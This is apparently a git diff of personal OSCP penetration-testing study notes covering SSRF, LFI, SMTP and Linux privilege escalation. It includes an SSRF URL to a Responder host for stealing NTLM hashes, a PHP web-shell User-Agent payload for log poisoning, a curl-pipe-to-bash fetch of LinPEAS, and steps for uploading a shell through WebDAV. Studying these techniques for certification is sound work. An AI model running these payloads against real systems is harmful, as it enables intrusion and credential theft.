@@ -16,6 +16,9 @@ description: Just some rough notes in preparation for the OSCP.
 * If a web application is vulnerable to SSRF and the host is Windows, you may be able to retrieve a Net-NTLMv2 hash. The following command assumes that the web server is running on TCP/8080:
   * `http://:8080/?url=http://127.0.0.1:8080/?url=http://<RESPONDER_IP>`
   * [This attack is explained amazingly in this blog post](https://blog.blazeinfosec.com/leveraging-web-application-vulnerabilities-to-steal-ntlm-hashes-2/).
+* If a WebDav directory is discovered during enumeration then it should be noted that an LFI vulnerability could be used to obtain the password and upload a PHP shell. The following is an example of a Webdav password location:
+  * `/var/www/html/webdav/passwd.dav`
+  * [HackTricks has a great guide](https://book.hacktricks.xyz/pentesting/pentesting-web/put-method-webdav) on uploading a shell with Curl or other methods of exploitation.
 
 ### SQL Injection (SQLi)
 
@@ -28,7 +31,7 @@ description: Just some rough notes in preparation for the OSCP.
 * If testing for Shellshock on SMTP then I have found[ this exploit ](https://github.com/3mrgnc3/pentest\_old/blob/master/postfix-shellshock-nc.py)to be the most reliable. It requires a valid email address so ensure you run `VRFY` to enumerate a valid email prior to execution.
 * If you can access the Apache logs through LFI and observe the 'User Agent' is viewable, we can potentially specify our user agent to PHP code and execute that on the target machine. [This video from John Hammond](https://www.youtube.com/watch?v=u\_uuk7FWWF4) is a great example.
   * Using this we can potentially turn an LFI into RCE. An example user agent would be the following: `User-Agent: <?php system(\$_GET['c']); ?>`
-  * Log into the SMTP server to identify the version if it is not returned in the Nmap scan. Identifying Postfix means that multiple exploits from Searchsploit may work: `searchsploit postfix`
+* Log into the SMTP server to identify the version if it is not returned in the Nmap scan. Identifying Postfix means that multiple exploits from Searchsploit may work: `searchsploit postfix`
 
 ### Privilege Escalation - Linux
 
@@ -37,6 +40,8 @@ description: Just some rough notes in preparation for the OSCP.
   * [Amazing Guide on Privilege Escalation with Fail2ban](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/)
 * If there are no writable directories then just pipe LinPEAS (or other tool of choice) directly into bash:
   * `curl 10.10.10.1:8080/linpeas.sh | bash`
+  * Run the following command to identify possible priivlege escalation efforts:
+    * `which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null`
 
 ### Privilege Escalation - Windows
 
